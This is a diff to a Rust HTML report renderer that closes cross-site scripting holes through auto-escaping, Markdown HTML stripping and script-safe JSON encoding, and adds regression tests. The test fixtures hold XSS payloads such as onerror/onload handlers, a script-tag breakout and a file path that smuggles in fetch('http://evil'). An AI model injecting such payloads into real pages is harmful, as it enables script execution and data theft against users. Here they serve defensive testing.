@@ -7,8 +7,8 @@ use std::path::Path;
 
 use flate2::write::GzEncoder;
 use flate2::Compression;
-use minijinja::{context, Environment, Value};
-use pulldown_cmark::{html, Options, Parser};
+use minijinja::{context, AutoEscape, Environment, Value};
+use pulldown_cmark::{html, Event, Options, Parser};
 
 use crate::core::Language;
 use crate::core::Result;
@@ -26,6 +26,7 @@ impl Renderer {
     /// Create a new renderer with the embedded template.
     pub fn new() -> Result<Self> {
         let mut env = Environment::new();
+        env.set_auto_escape_callback(|_| AutoEscape::Html);
 
         // Add template filters (equivalent to Go's template.FuncMap)
         env.add_filter("rel_path", rel_path);
@@ -419,11 +420,13 @@ fn markdown_filter(s: &str) -> Value {
     options.insert(Options::ENABLE_STRIKETHROUGH);
     options.insert(Options::ENABLE_TABLES);
 
-    let parser = Parser::new_ext(s, options);
+    let parser = Parser::new_ext(s, options).filter_map(|event| match event {
+        Event::Html(_) | Event::InlineHtml(_) => None,
+        event => Some(event),
+    });
     let mut html_output = String::new();
     html::push_html(&mut html_output, parser);
 
-    // Mark as safe HTML (won't be escaped)
     Value::from_safe_string(html_output)
 }
 
@@ -538,9 +541,17 @@ fn truncate_path(s: &str, n: usize) -> String {
     format!(".../{}/{}", truncated_prefix, filename)
 }
 
-/// Convert value to JSON string.
-fn tojson_filter(value: Value) -> String {
-    serde_json::to_string(&value).unwrap_or_else(|_| "null".to_string())
+/// Convert a value to JSON that is safe to embed in HTML script elements.
+fn tojson_filter(value: Value) -> Value {
+    let json = serde_json::to_string(&value).unwrap_or_else(|_| "null".to_string());
+    let escaped = json
+        .replace('&', r"\u0026")
+        .replace('<', r"\u003c")
+        .replace('>', r"\u003e")
+        .replace('\'', r"\u0027")
+        .replace('\u{2028}', r"\u2028")
+        .replace('\u{2029}', r"\u2029");
+    Value::from_safe_string(escaped)
 }
 
 /// Format number with thousands separator.
@@ -728,7 +739,8 @@ fn instability_class(instability: f64) -> &'static str {
 
 fn minify_html_output(input: &[u8]) -> Vec<u8> {
     let cfg = minify_html::Cfg {
-        minify_js: true,
+        // JS minification decodes JSON's script-safe Unicode escapes back into literal tags.
+        minify_js: false,
         minify_css: true,
         ..Default::default()
     };
@@ -739,12 +751,12 @@ fn minify_html_output(input: &[u8]) -> Vec<u8> {
 // JSON Table Data Builders
 // ============================================================================
 
-/// Serialize rows as a JSON array-of-arrays string for simple-datatables `data` option.
-fn rows_to_json(rows: &[Vec<String>]) -> String {
-    serde_json::to_string(rows).unwrap_or_else(|_| "[]".to_string())
+/// Convert rows to a template value for simple-datatables' `data` option.
+fn rows_to_json(rows: &[Vec<String>]) -> Value {
+    Value::from_serialize(rows)
 }
 
-fn build_hotspots_json(files: &[HotspotItem], roots: &[String]) -> String {
+fn build_hotspots_json(files: &[HotspotItem], roots: &[String]) -> Value {
     let rows: Vec<Vec<String>> = files
         .iter()
         .map(|item| {
@@ -764,7 +776,7 @@ fn build_hotspots_json(files: &[HotspotItem], roots: &[String]) -> String {
     rows_to_json(&rows)
 }
 
-fn build_satd_json(items: &[SATDItem], roots: &[String]) -> String {
+fn build_satd_json(items: &[SATDItem], roots: &[String]) -> Value {
     let rows: Vec<Vec<String>> = items
         .iter()
         .map(|item| {
@@ -787,7 +799,7 @@ fn build_satd_json(items: &[SATDItem], roots: &[String]) -> String {
     rows_to_json(&rows)
 }
 
-fn build_churn_json(files: &[ChurnFile]) -> String {
+fn build_churn_json(files: &[ChurnFile]) -> Value {
     let rows: Vec<Vec<String>> = files
         .iter()
         .map(|item| {
@@ -808,7 +820,7 @@ fn build_churn_json(files: &[ChurnFile]) -> String {
     rows_to_json(&rows)
 }
 
-fn build_cohesion_json(classes: &[CohesionClass]) -> String {
+fn build_cohesion_json(classes: &[CohesionClass]) -> Value {
     let rows: Vec<Vec<String>> = classes
         .iter()
         .map(|item| {
@@ -832,7 +844,7 @@ fn build_cohesion_json(classes: &[CohesionClass]) -> String {
     rows_to_json(&rows)
 }
 
-fn build_graph_json(nodes: &[GraphNode], roots: &[String]) -> String {
+fn build_graph_json(nodes: &[GraphNode], roots: &[String]) -> Value {
     let rows: Vec<Vec<String>> = nodes
         .iter()
         .map(|node| {
@@ -856,7 +868,7 @@ fn build_graph_json(nodes: &[GraphNode], roots: &[String]) -> String {
     rows_to_json(&rows)
 }
 
-fn build_tdg_json(files: &[TdgFile], roots: &[String]) -> String {
+fn build_tdg_json(files: &[TdgFile], roots: &[String]) -> Value {
     let rows: Vec<Vec<String>> = files
         .iter()
         .map(|item| {
@@ -882,7 +894,7 @@ fn build_tdg_json(files: &[TdgFile], roots: &[String]) -> String {
     rows_to_json(&rows)
 }
 
-fn build_temporal_json(couplings: &[TemporalCoupling], roots: &[String]) -> String {
+fn build_temporal_json(couplings: &[TemporalCoupling], roots: &[String]) -> Value {
     let rows: Vec<Vec<String>> = couplings
         .iter()
         .map(|item| {
@@ -913,6 +925,101 @@ fn html_escape(s: &str) -> String {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use serde_json::json;
+
+    fn write_fixture(path: &Path, value: serde_json::Value) {
+        fs::write(path, serde_json::to_vec(&value).unwrap()).unwrap();
+    }
+
+    #[test]
+    fn test_renderer_escapes_repo_data_in_html_and_scripts() {
+        let data_dir = tempfile::tempdir().unwrap();
+        let insights_dir = data_dir.path().join("insights");
+        fs::create_dir(&insights_dir).unwrap();
+
+        write_fixture(
+            &data_dir.path().join("ownership.json"),
+            json!({
+                "summary": {
+                    "total_files": 2,
+                    "bus_factor": 1,
+                    "top_contributors": [
+                        { "name": "');alert(document.domain);//", "files_owned": 1 },
+                        { "name": "Normal Author", "files_owned": 1 }
+                    ]
+                }
+            }),
+        );
+        write_fixture(
+            &data_dir.path().join("trend.json"),
+            json!({
+                "points": [{
+                    "date": "2026-08-01",
+                    "score": 75,
+                    "notable_commits": ["</script><script>alert(1)</script>"]
+                }]
+            }),
+        );
+        write_fixture(
+            &data_dir.path().join("hotspots.json"),
+            json!({
+                "files": [{
+                    "path": "x');fetch('http://evil')//.rs",
+                    "hotspot_score": 0.9,
+                    "commits": 3,
+                    "avg_cognitive": 4.0
+                }]
+            }),
+        );
+        write_fixture(
+            &data_dir.path().join("flags.json"),
+            json!({
+                "flags": [{
+                    "flag_key": "<svg onload=alert(1)>",
+                    "provider": "test"
+                }]
+            }),
+        );
+        write_fixture(
+            &insights_dir.join("summary.json"),
+            json!({
+                "executive_summary": "<img src=x onerror=alert(1)> hello **bold**"
+            }),
+        );
+
+        let mut output = Vec::new();
+        Renderer::new()
+            .unwrap()
+            .render(data_dir.path(), &mut output)
+            .unwrap();
+        let html = String::from_utf8(output).unwrap();
+
+        assert!(!html.contains("<script>alert"));
+        assert!(!html.contains("');alert("));
+        assert!(!html.contains("x');fetch("));
+        assert!(!html.contains("<img src=x onerror=alert(1)>"));
+        assert!(!html.contains("onerror=alert"));
+        assert!(!html.contains("<svg onload=alert(1)>"));
+        assert!(html.contains(r"\u003c/script\u003e\u003cscript\u003ealert(1)"));
+        assert!(html.contains(r"x\u0027);fetch(\u0027http://evil\u0027)//.rs"));
+        assert!(html.contains(r#"window.__td_hotspots=[["\u003ccode\u003e"#));
+        assert!(!html.contains("window.__td_hotspots=[[&#34;"));
+        assert!(html.contains("hello"));
+        assert!(html.contains("&lt;svg onload=alert(1)>"));
+        assert!(html.contains("Normal Author"));
+        assert!(html.contains("<strong>bold</strong>"));
+    }
+
+    #[test]
+    fn test_tojson_escapes_script_sensitive_characters() {
+        let encoded = tojson_filter(Value::from("<>&'\u{2028}\u{2029}"));
+
+        assert_eq!(
+            encoded.as_str(),
+            Some(r#""\u003c\u003e\u0026\u0027\u2028\u2029""#)
+        );
+        assert!(encoded.is_safe());
+    }
 
     #[test]
     fn test_score_class() {
@@ -1121,8 +1228,8 @@ mod tests {
             },
         ];
         let roots = vec!["/root".to_string()];
-        let json = build_hotspots_json(&files, &roots);
-        let parsed: Vec<Vec<String>> = serde_json::from_str(&json).unwrap();
+        let json = tojson_filter(build_hotspots_json(&files, &roots));
+        let parsed: Vec<Vec<String>> = serde_json::from_str(json.as_str().unwrap()).unwrap();
         assert_eq!(parsed.len(), 2);
         assert_eq!(parsed[0].len(), 5);
         assert!(parsed[0][0].contains("<code>"));
@@ -1134,8 +1241,8 @@ mod tests {
 
     #[test]
     fn test_build_temporal_json_empty() {
-        let json = build_temporal_json(&[], &[]);
-        assert_eq!(json, "[]");
+        let json = tojson_filter(build_temporal_json(&[], &[]));
+        assert_eq!(json.as_str(), Some("[]"));
     }
 
     #[test]
